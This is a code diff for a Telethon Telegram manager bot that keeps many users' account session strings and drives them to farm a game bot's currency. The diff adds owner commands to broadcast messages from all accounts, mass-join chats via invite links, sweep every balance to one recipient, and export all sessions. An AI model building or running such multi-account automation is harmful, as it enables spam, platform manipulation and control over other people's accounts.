@@ -1,3 +1,4 @@
+# main.py
 import logging
 import asyncio
 import json
@@ -9,6 +10,8 @@ import time
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
+from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest
 
 import config
 import database
@@ -30,7 +33,7 @@ logger = logging.getLogger(__name__)
 DB_FILE = "db.json"
 
 # Initialize Manager Bot
-bot = TelegramClient('manager_session', config.API_ID, config.API_HASH).start(bot_token=config.BOT_TOKEN)
+bot = TelegramClient('manager_session', config.API_ID, config.API_HASH)
 
 # --- 2. PERSISTENCE FUNCTIONS ---
 
@@ -47,8 +50,8 @@ def save_database():
             data[str(uid)] = {
                 'session': client.session.save(),
                 'name': user_info.get('name', 'Unknown'),
-                'next_play_time': next_time, # <--- SAVES TIMER
-                'extols': extols             # <--- SAVES BALANCE
+                'next_play_time': next_time, 
+                'extols': extols             
             }
         except Exception as e:
             logger.error(f"Failed to save session for {uid}: {e}")
@@ -73,7 +76,7 @@ async def load_database():
                 uid = int(uid_str)
                 session_str = info['session']
                 name = info['name']
-                next_play_time = info.get('next_play_time', 0) # <--- LOADS TIMER
+                next_play_time = info.get('next_play_time', 0) 
                 extols = info.get('extols', 0)
                 
                 # Reconnect the client
@@ -101,10 +104,7 @@ async def load_database():
 # --- 3. HELPER FUNCTIONS ---
 
 async def get_balance_for_user(user_id, client):
-    """
-    Robust balance checker. Ignores the specific currency symbol and
-    captures the number after the word 'extols'.
-    """
+    """Robust balance checker."""
     try:
         async with client.conversation(config.TARGET_BOT, timeout=30) as conv:
             await conv.send_message('/extols')
@@ -136,7 +136,6 @@ async def register_client(uid, client):
     me = await client.get_me()
     
     database.clients[uid] = client
-    # Initialize data if not present, otherwise keep existing (to preserve cooldowns)
     if uid not in database.user_data:
         database.user_data[uid] = {
             'extols': 0, 
@@ -191,14 +190,20 @@ async def help_cmd(event):
             "❖ **ADMIN DASHBOARD**\n"
             "━━━━━━━━━━━━━━━━━━━━\n"
             "◆ **Finance & Audit**\n"
-            "◇ `/check` - Audit All Wallets\n"
-            "◇ `/self_reply` - Transfer Funds (Reply)\n\n"
+            "◇ `/check` - Audit All Wallets (Batched)\n"
+            "◇ `/self_reply` - Sweep All Funds (Reply)\n\n"
             "◆ **System Controls**\n"
             "◇ `/stats` - Global Stats & Queue\n"
             "◇ `/update` - Pull & Restart\n"
             "◇ `/log` - View System Logs\n"
-            "◇ `/allslot` - Force Start All\n\n"
-            "◆ **Database**\n"
+            "◇ `/allslot` - Force Start All\n"
+            "◇ `/sleep` - Master Sleep Control\n\n"
+            "◆ **Mass Actions**\n"
+            "◇ `/send [chat_id] [msg]` - Mass Broadcast\n"
+            "◇ `/sneak [link]` - Mass Join Chat\n\n"
+            "◆ **Database & Queue**\n"
+            "◇ `/forceout [id]` - Nuclear Logout User\n"
+            "◇ `/resetque` - Clear Farming Queue\n"
             "◇ `/sessionexport` - Backup Sessions\n"
             "◇ `/sessionimport` - Restore Sessions\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -228,60 +233,8 @@ async def update_cmd(event):
     except Exception as e:
         await msg.edit(f"❌ **Update Failed:**\n`{e}`\n\nMake sure git is installed.")
 
-# --- CHECK / AUDIT COMMAND ---
-@bot.on(events.NewMessage(pattern=r'/send (-?\d+) (.+)', from_users=[config.OWNER_ID]))
-async def mass_send_cmd(event):
-    target_chat = int(event.pattern_match.group(1))
-    text_to_send = event.pattern_match.group(2)
-    
-    # Filter out Owner so only worker bots send the message
-    worker_uids = [uid for uid in database.clients.keys() if uid != config.OWNER_ID]
-    
-    if not worker_uids:
-        return await event.respond("❌ No worker accounts available to send messages.")
+# --- CHECK / AUDIT COMMAND (BATCHED) ---
 
-    status_msg = await event.respond("📡 **Preparing Broadcast...**")
-    
-    total_bots = len(worker_uids)
-    success = 0
-    fail = 0
-
-    for i, uid in enumerate(worker_uids, 1):
-        client = database.clients[uid]
-        name = database.user_data.get(uid, {}).get('name', 'Unknown')
-
-        # 1. Update Progress Bar
-        percentage = int((i / total_bots) * 100)
-        filled = percentage // 10
-        bar = "⬢" * filled + "⬡" * (10 - filled)
-        
-        await status_msg.edit(
-            f"📡 **Broadcasting Message**\n"
-            f"`{bar}` {percentage}%\n"
-            f"Sending from: **{name}**"
-        )
-
-        try:
-            # 2. Send the message
-            await client.send_message(target_chat, text_to_send)
-            success += 1
-            
-            # 3. Safety Delay (3 seconds per bot)
-            await asyncio.sleep(3)
-            
-        except Exception as e:
-            logger.error(f"Failed to send from {name}: {e}")
-            fail += 1
-
-    # Final Summary
-    await status_msg.edit(
-        f"✅ **Broadcast Complete**\n"
-        f"━━━━━━━━━━━━━━━━\n"
-        f"📤 Sent: `{success}` bots\n"
-        f"❌ Failed: `{fail}` bots\n"
-        f"📍 Target: `{target_chat}`"
-    )
-    
 @bot.on(events.NewMessage(pattern='/check', from_users=[config.OWNER_ID]))
 async def check_cmd(event):
     if not database.clients:
@@ -297,14 +250,11 @@ async def check_cmd(event):
     for i in range(0, total_clients, 5):
         batch = all_uids[i:i+5]
         
-        # 1. Update Progress Bar & Animation
         progress = i + len(batch)
         percentage = int((progress / total_clients) * 100)
-        # 10-segment bar for the ⬢/⬡ style
         filled = percentage // 10
         bar = "⬢" * filled + "⬡" * (10 - filled)
         
-        # Get names of people in the current batch for the display
         current_names = ", ".join([database.user_data.get(uid, {}).get('name', 'Unknown') for uid in batch])
 
         await status_msg.edit(
@@ -313,21 +263,18 @@ async def check_cmd(event):
             f"Checking: **{current_names}**"
         )
 
-        # 2. Run batch concurrently
         batch_tasks = [get_balance_for_user(uid, database.clients[uid]) for uid in batch]
         batch_results = await asyncio.gather(*batch_tasks)
         results.extend(batch_results)
         
-        # Delay to stay under Telegram's edit limit (max 30 edits per min)
         await asyncio.sleep(1.5)
 
-    # 3. Final Summary
     total_extols = 0
     msg = "💰 **WALLET AUDIT COMPLETE**\n━━━━━━━━━━━━━━━━\n"
     
     for name, balance, error in results:
         if error:
-            msg += f"» {name} - ⚠️ Error\n" # Shorter error for clean look
+            msg += f"» {name} - ⚠️ Error\n" 
         else:
             msg += f"» {name} - Є{balance}\n"
             total_extols += balance
@@ -335,10 +282,7 @@ async def check_cmd(event):
     msg += f"━━━━━━━━━━━━━━━━\n➤ **Total - Є{total_extols}**"
     await status_msg.edit(msg)
 
-    
-
-
-# --- SELF REPLY COMMAND ---
+# --- SELF REPLY (MASS SWEEP) ---
 
 @bot.on(events.NewMessage(pattern=r'/self_reply', from_users=[config.OWNER_ID]))
 async def self_reply_cmd(event):
@@ -346,10 +290,9 @@ async def self_reply_cmd(event):
         return await event.respond("❌ **Error:** Reply to the target message in the group.")
     
     reply_msg = await event.get_reply_message()
-    group_id = event.chat_id  # Automatically uses the group where command is sent
+    group_id = event.chat_id  
     target_msg_id = reply_msg.id
     
-    # Filter out the Owner's ID from the transfer list
     active_uids = [uid for uid in database.clients.keys() if uid != config.OWNER_ID]
     
     if not active_uids:
@@ -363,12 +306,10 @@ async def self_reply_cmd(event):
 
     for i, uid in enumerate(active_uids, 1):
         client = database.clients[uid]
-        user_info = database.user_data.get(uid, {})
-        name = user_info.get('name', 'Unknown')
+        name = database.user_data.get(uid, {}).get('name', 'Unknown')
 
-        # 1. Animation & Progress
         percentage = int((i / total_bots) * 100)
-        bar = "▰" * (percentage // 10) + "▱" * (10 - (percentage // 10))
+        bar = "⬢" * (percentage // 10) + "⬡" * (10 - (percentage // 10))
         
         await status_msg.edit(
             f"🚀 **Transferring Funds**\n"
@@ -377,14 +318,12 @@ async def self_reply_cmd(event):
         )
 
         try:
-            # 2. Fetch latest balance first
             name_check, balance, error = await get_balance_for_user(uid, client)
             
             if error or balance <= 0:
                 logger.info(f"Skipping {name}: Balance is 0 or error.")
                 continue
 
-            # 3. Send the /give command
             cmd_text = f"/give@{config.TARGET_BOT_USERNAME} {balance}"
             await client.send_message(
                 entity=group_id,
@@ -394,14 +333,11 @@ async def self_reply_cmd(event):
             
             success_count += 1
             total_given += balance
-            
-            # 4. Enforce 3-second delay between users
             await asyncio.sleep(3) 
             
         except Exception as e:
             logger.error(f"Transfer failed for {name}: {e}")
 
-    # Final Summary
     await status_msg.edit(
         f"✅ **Mass Transfer Complete**\n"
         f"━━━━━━━━━━━━━━━━\n"
@@ -410,7 +346,61 @@ async def self_reply_cmd(event):
         f"📍 Group: `{group_id}`"
     )
 
-# --- LOGIN / SLOGIN / LOGOUT ---
+# --- GLOBAL SLEEP MODE ---
+
+@bot.on(events.NewMessage(pattern='/sleep', from_users=[config.OWNER_ID]))
+async def sleep_cmd(event):
+    is_sleeping = getattr(database, 'global_sleep', False)
+    status_text = "💤 **ACTIVE** (Bot is Paused)" if is_sleeping else "🚀 **INACTIVE** (Bot is Running)"
+    
+    buttons = [
+        [Button.inline("Turn ON (Pause) 💤", b"sleep_on"), 
+         Button.inline("Turn OFF (Resume) 🚀", b"sleep_off")]
+    ]
+    
+    await event.respond(
+        f"⚙️ **Master Sleep Control**\n"
+        f"━━━━━━━━━━━━━━━━\n"
+        f"Current Status: {status_text}\n\n"
+        f"ℹ️ *When ON, the bot will stop playing slots. It will resume automatically when turned OFF.*", 
+        buttons=buttons
+    )
+
+@bot.on(events.CallbackQuery(pattern=b'sleep_on'))
+async def sleep_on_cb(event):
+    if event.sender_id != config.OWNER_ID:
+        return await event.answer("❌ Admin only.", alert=True)
+        
+    database.global_sleep = True
+    await event.edit(
+        f"⚙️ **Master Sleep Control**\n"
+        f"━━━━━━━━━━━━━━━━\n"
+        f"Current Status: 💤 **ACTIVE** (Bot is Paused)\n\n"
+        f"ℹ️ *When ON, the bot will stop playing slots. It will resume automatically when turned OFF.*",
+        buttons=event.message.buttons
+    )
+    await event.answer("💤 Sleep Mode Enabled. Worker paused.")
+
+@bot.on(events.CallbackQuery(pattern=b'sleep_off'))
+async def sleep_off_cb(event):
+    if event.sender_id != config.OWNER_ID:
+        return await event.answer("❌ Admin only.", alert=True)
+        
+    database.global_sleep = False
+    
+    if not database.is_running and database.farming_queue:
+        asyncio.create_task(worker.start_relay_race())
+
+    await event.edit(
+        f"⚙️ **Master Sleep Control**\n"
+        f"━━━━━━━━━━━━━━━━\n"
+        f"Current Status: 🚀 **INACTIVE** (Bot is Running)\n\n"
+        f"ℹ️ *When ON, the bot will stop playing slots. It will resume automatically when turned OFF.*",
+        buttons=event.message.buttons
+    )
+    await event.answer("🚀 Sleep Mode Disabled. Worker resuming.")
+
+# --- LOGIN / SLOGIN / LOGOUT / FORCEOUT ---
 
 @bot.on(events.NewMessage(pattern='/slogin'))
 async def slogin_cmd(event):
@@ -479,7 +469,6 @@ async def logout_cmd(event):
         
         save_database()
         await event.respond("**Signed out — come back soon!**")
-# --- ADMIN CONTROLS: FORCEOUT ---
 
 @bot.on(events.NewMessage(pattern=r'/forceout (\d+)', from_users=[config.OWNER_ID]))
 async def forceout_cmd(event):
@@ -489,11 +478,9 @@ async def forceout_cmd(event):
         return await event.respond(f"❌ **User ID `{target_uid}` not found in active sessions.**")
 
     try:
-        # 1. Disconnect the client session
         client = database.clients[target_uid]
         await client.disconnect()
         
-        # 2. Remove from Memory
         del database.clients[target_uid]
         if target_uid in database.user_data:
             name = database.user_data[target_uid].get('name', 'Unknown')
@@ -501,11 +488,9 @@ async def forceout_cmd(event):
         else:
             name = "Unknown"
             
-        # 3. Remove from Queue if present
         if target_uid in database.farming_queue:
             database.farming_queue.remove(target_uid)
             
-        # 4. Save changes to disk
         save_database()
         
         await event.respond(f"✅ **Force Logged Out:** {name} (`{target_uid}`)\nSession deleted and removed from queue.")
@@ -513,7 +498,7 @@ async def forceout_cmd(event):
         
     except Exception as e:
         await event.respond(f"❌ **Error during forceout:** `{e}`")
-        
+
 # --- FARMING & STATS ---
 
 @bot.on(events.NewMessage(pattern='/slot'))
@@ -521,14 +506,16 @@ async def slot_cmd(event):
     uid = event.sender_id
     if uid not in database.clients: return await event.respond("❌ Login first.")
     
-    # Add to queue if not present
     if uid not in database.farming_queue:
         database.farming_queue.append(uid)
-        await event.respond("✅ **Added to Queue.**")
+        
+        if getattr(database, 'global_sleep', False):
+            await event.respond("⚠️ **Note:** The bot is currently sleeping. You are in the queue and will spin when the Admin wakes it up.")
+        else:
+            await event.respond("✅ **Added to Queue.**")
     else:
         await event.respond("⚠️ Already in queue.")
     
-    # Force start worker immediately regardless of queue state
     if not database.is_running:
         asyncio.create_task(worker.start_relay_race())
 
@@ -540,7 +527,6 @@ async def allslot_cmd(event):
     
     for uid in database.clients:
         if uid not in database.farming_queue:
-            # CHECK COOLDOWN: Only add if they are ready to play
             user_info = database.user_data.get(uid, {})
             next_play = user_info.get('next_play_time', 0)
             
@@ -556,9 +542,15 @@ async def allslot_cmd(event):
         
     await event.respond(msg)
     
-    # Start worker if not running
     if not database.is_running and added_count > 0:
         asyncio.create_task(worker.start_relay_race())
+
+@bot.on(events.NewMessage(pattern='/resetque', from_users=[config.OWNER_ID]))
+async def resetque_cmd(event):
+    queue_count = len(database.farming_queue)
+    database.farming_queue.clear()
+    await event.respond(f"🗑️ **Queue Reset:** Removed {queue_count} users from the active farming list.")
+    logger.info(f"Admin reset the farming queue. Previous count: {queue_count}")
 
 @bot.on(events.NewMessage(pattern='/stats'))
 async def stats_cmd(event):
@@ -569,7 +561,6 @@ async def stats_cmd(event):
     )
     for uid, data in database.user_data.items():
         icon = utils.format_status(uid, database.current_active_user)
-        # Optional: Show sleep time in stats
         if time.time() < data.get('next_play_time', 0):
             remaining = int(data['next_play_time'] - time.time())
             icon += f" (💤 {remaining // 60}m)"
@@ -577,11 +568,112 @@ async def stats_cmd(event):
         msg += f"```❑ {data['name']} ‹{uid}› — {data['extols']} — {icon}```\n"
     await event.respond(msg + "━━━━━━━━━━━━━━━━")
 
+# --- MASS SEND & SNEAK COMMANDS ---
+
+@bot.on(events.NewMessage(pattern=r'/send (-?\d+) (.+)', from_users=[config.OWNER_ID]))
+async def mass_send_cmd(event):
+    target_chat = int(event.pattern_match.group(1))
+    text_to_send = event.pattern_match.group(2)
+    
+    worker_uids = [uid for uid in database.clients.keys() if uid != config.OWNER_ID]
+    
+    if not worker_uids:
+        return await event.respond("❌ No worker accounts available to send messages.")
+
+    status_msg = await event.respond("📡 **Preparing Broadcast...**")
+    
+    total_bots = len(worker_uids)
+    success = 0
+    fail = 0
+
+    for i, uid in enumerate(worker_uids, 1):
+        client = database.clients[uid]
+        name = database.user_data.get(uid, {}).get('name', 'Unknown')
+
+        percentage = int((i / total_bots) * 100)
+        filled = percentage // 10
+        bar = "⬢" * filled + "⬡" * (10 - filled)
+        
+        await status_msg.edit(
+            f"📡 **Broadcasting Message**\n"
+            f"`{bar}` {percentage}%\n"
+            f"Sending from: **{name}**"
+        )
+
+        try:
+            await client.send_message(target_chat, text_to_send)
+            success += 1
+            await asyncio.sleep(3)
+        except Exception as e:
+            logger.error(f"Failed to send from {name}: {e}")
+            fail += 1
+
+    await status_msg.edit(
+        f"✅ **Broadcast Complete**\n"
+        f"━━━━━━━━━━━━━━━━\n"
+        f"📤 Sent: `{success}` bots\n"
+        f"❌ Failed: `{fail}` bots\n"
+        f"📍 Target: `{target_chat}`"
+    )
+
+@bot.on(events.NewMessage(pattern=r'/sneak (\S+)', from_users=[config.OWNER_ID]))
+async def sneak_cmd(event):
+    link = event.pattern_match.group(1)
+    
+    worker_uids = [uid for uid in database.clients.keys() if uid != config.OWNER_ID]
+    
+    if not worker_uids:
+        return await event.respond("❌ No worker accounts available to join the chat.")
+
+    status_msg = await event.respond(f"🕵️‍♂️ **Initiating Mass Join...**\nTarget: `{link}`")
+    
+    total_bots = len(worker_uids)
+    success = 0
+    fail = 0
+
+    is_private = "+" in link or "joinchat/" in link
+    if is_private:
+        invite_hash = link.split("+")[-1] if "+" in link else link.split("joinchat/")[-1]
+        invite_hash = invite_hash.strip("/")
+
+    for i, uid in enumerate(worker_uids, 1):
+        client = database.clients[uid]
+        name = database.user_data.get(uid, {}).get('name', 'Unknown')
+
+        percentage = int((i / total_bots) * 100)
+        filled = percentage // 10
+        bar = "⬢" * filled + "⬡" * (10 - filled)
+        
+        await status_msg.edit(
+            f"🕵️‍♂️ **Sneaking into Chat**\n"
+            f"`{bar}` {percentage}%\n"
+            f"Joining: **{name}**"
+        )
+
+        try:
+            if is_private:
+                await client(ImportChatInviteRequest(invite_hash))
+            else:
+                await client(JoinChannelRequest(link))
+            
+            success += 1
+            await asyncio.sleep(3)
+        except Exception as e:
+            logger.error(f"Failed to join {link} for {name}: {e}")
+            fail += 1
+
+    await status_msg.edit(
+        f"✅ **Sneak Complete**\n"
+        f"━━━━━━━━━━━━━━━━\n"
+        f"📥 Joined: `{success}` bots\n"
+        f"❌ Failed: `{fail}` bots\n"
+        f"📍 Target: `{link}`"
+    )
+
 # --- LOGGING COMMANDS ---
 
 @bot.on(events.NewMessage(pattern='/log', from_users=[config.OWNER_ID]))
 async def log_cmd(event):
-    """Fetches and displays the last 15 lines of the system logs."""
     if not os.path.exists(config.LOG_FILE):
         return await event.respond("❌ **No Log File Found.**")
 
@@ -589,12 +681,8 @@ async def log_cmd(event):
         with open(config.LOG_FILE, "r", encoding="utf-8", errors="ignore") as f:
             lines = f.readlines()
         
-        # Get only the last 15 lines
         last_lines = lines[-15:]
-        logs = "".join(last_lines)
-        
-        # Sanitize logs: replace backticks to prevent markdown errors
-        logs = logs.replace('`', "'")
+        logs = "".join(last_lines).replace('`', "'")
         
         if not logs.strip():
             logs = "Log file is empty."
@@ -617,21 +705,15 @@ async def log_ref(event):
         with open(config.LOG_FILE, "r", encoding="utf-8", errors="ignore") as f:
             lines = f.readlines()
         
-        # Get only the last 15 lines
         last_lines = lines[-15:]
-        logs = "".join(last_lines)
-        
-        logs = logs.replace('`', "'")
+        logs = "".join(last_lines).replace('`', "'")
         
         if not logs.strip():
             logs = "Log file is empty."
 
         new_text = f"📝 **System Logs (Last 15 Lines):**\n```\n{logs}\n```"
-        
-        # FIX: Use get_message() to avoid AttributeError
         msg = await event.get_message()
         
-        # Check if text changed
         if msg.text.strip() == new_text.strip():
             await event.answer("✅ Logs are already up to date.", alert=True)
         else:
@@ -644,7 +726,6 @@ async def log_ref(event):
 @bot.on(events.CallbackQuery(pattern=b'log_clear'))
 async def log_clr(event):
     try:
-        # Open in 'w' mode to wipe content
         with open(config.LOG_FILE, "w") as f:
             f.write("")
         
@@ -668,7 +749,8 @@ async def log_dl(event):
     else:
         await event.answer("❌ Log file does not exist.", alert=True)
 
-# Session Export/Import
+# --- SESSION EXPORT/IMPORT ---
+
 @bot.on(events.NewMessage(pattern='/sessionexport', from_users=[config.OWNER_ID]))
 async def sexport(e):
     d = database.get_all_sessions()
@@ -691,6 +773,20 @@ async def simport(e):
     except Exception as x: await e.respond(f"Error: {x}")
 
 # --- STARTUP ---
-print("✅ Manager Bot Started...")
-bot.loop.run_until_complete(load_database())
-bot.run_until_disconnected()
+
+async def main():
+    # 1. Load data from disk
+    await load_database()
+    
+    # 2. Start the manager bot
+    await bot.start(bot_token=config.BOT_TOKEN)
+    logger.info("✅ Manager Bot is Online!")
+    
+    # 3. Run until interrupted
+    await bot.run_until_disconnected()
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        logger.info("Bot stopped by user.")
